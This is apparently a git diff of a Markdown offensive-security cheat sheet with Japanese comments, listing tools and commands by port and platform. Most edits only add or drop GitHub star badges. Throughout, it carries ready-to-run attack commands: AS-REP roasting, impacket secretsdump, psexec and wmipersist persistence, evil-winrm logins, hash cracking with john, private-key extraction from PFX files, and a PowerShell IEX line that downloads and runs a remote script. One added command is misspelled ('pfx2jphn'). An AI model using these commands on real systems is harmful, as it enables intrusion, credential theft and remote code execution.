@@ -91,7 +91,7 @@ nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
 - impacket-GetNPUsers ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
 - impacket-GetUserSPNs
 - kerbrute ![GitHub Repo stars](https://img.shields.io/github/stars/ropnop/kerbrute?style=social)
-- netexec ![GitHub Repo stars](https://img.shields.io/github/stars/Pennyw0rth/NetExec?style=social)
+- netexec
 ```sh
 # ASREPRoast (TCP389番も必要)
 netexec ldap 'IP' -u 'USERLIST' -p '' --asreproast 'FILE'
@@ -120,7 +120,7 @@ https://github.com/XiaoliChan/wmiexec-Pro
 ```sh
 ./godap 'IP' -u 'USERNAME' -p 'PASSWORD'
 ```
-- impacket-changepasswd ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
+- impacket-changepasswd
 - impacket-findDelegation
 - impacket-GetADComputers
 - impacket-GetADUssers
@@ -213,7 +213,7 @@ hekatomb 'DOMAIN/USERNAME:PASSWORD@IP'
 # enum4linuxより２倍はやい
 enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
 ```
-- impacket ![GitHub Repo stars](https://img.shields.io/github/stars/fortra/impacket?style=social)
+- impacket
 ```sh
 # exec
 impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
@@ -271,7 +271,7 @@ impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME
 impacket-wmipersist 'DOMAIN/USERNAME:PASSWORD@IP' install -name 'NAME' -command "COMMAND"
 ```
 - impacket-wmiquery
-- netexec ![GitHub Repo stars](https://img.shields.io/github/stars/Pennyw0rth/NetExec?style=social)
+- netexec
 ```sh
 # guest
 netexec smb 'IP' -u ' ' -p ''
@@ -355,6 +355,14 @@ netexec winrm 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -X 'POWERSHELLCOMMAND'
 ```
 
 
+## 5986
+- evil-winrm
+```sh
+evil-winrm -S -u 'USERNAME' -p 'PASSWORD' -i 'IP'
+evil-winrm -S -c 'CERT.pem' -k 'PRIVKEY.pem' -r 'DOMAIN' -i 'IP'
+```
+
+
 ## Kali
 - 2to3-2.7
 ```sh
@@ -382,9 +390,11 @@ impacket-smbserver -smb2support 'SHARENAME' 'PATH'
 - john
 ```sh
 keepass2john passcodes.kdbx > 'OUTPUT.txt'
+pfx2jphn 'PFX' > 'OUTPUT.txt'
 ssh2john 'PRIVATEKEY' > 'OUTPUT.txt'
+zip2john 'ZIP' > 'OUTPUT.txt'
 
-john --wordlist=/usr/share/wordlists/rockyou.txt --format='FORMAT' 'HASH'
+john --wordlist=/usr/share/wordlists/rockyou.txt --format='FORMAT' 'OUTPUT.txt'
 ```
 - msfvenom
 ```sh
@@ -397,6 +407,9 @@ name-that-hash -f 'hash.txt' --no-banner --no-john
 - openssl
 ```sh
 openssl rsa -in 'INPUT.txt' -out 'OUTPUT.txt'
+
+openssl pkcs12 -in 'PFX' -clcerts -nokeys -out cert.crt
+openssl pkcs12 -in 'PFX' -nocerts -out privkey.pem -nodes 
 ```
 - phpbash  
 [phpbash](https://github.com/Arrexel/phpbash)
@@ -415,24 +428,30 @@ puttygen 'PUTTY_PRIVATEKEY' -O private-openssh -o 'OUTPUT_PRIVATEKEY'
 
 
 ## windows
-- AdSyncDecrypt  
-[AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt)
+- [AdSyncDecrypt](https://github.com/VbScrub/AdSyncDecrypt) ![GitHub Repo stars](https://img.shields.io/github/stars/VbScrub/AdSyncDecrypt?style=social)
 - cmd
 ```bat
 # execute 64bit process on 32bit process
 C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
 ```
+- [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
+```powershell
+Find-AdmPwdExtendedRights
+Find-LAPSDelegatedGroups
+Get-LAPSComputers
+```
 - powershell  
-  [nishang](https://github.com/samratashok/nishang)
+  [nishang](https://github.com/samratashok/nishang) ![GitHub Repo stars](https://img.shields.io/github/stars/samratashok/nishang?style=social)
 ```powershell
 [Environment]::Is64BitOperatingSystem
 [Environment]::Is64BitProcess
 IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
 ```
-- winpeas
+- winpeas ![GitHub Repo stars](https://img.shields.io/github/stars/peass-ng/PEASS-ng?style=social)
 ```bat
 # 32bit or 64bit のバージョンに注意
 .\winPEASx64.exe userinfo quiet
+.\winPEASx64.exe systeminfo quiet
 ```
 ### exploit
 #### windows
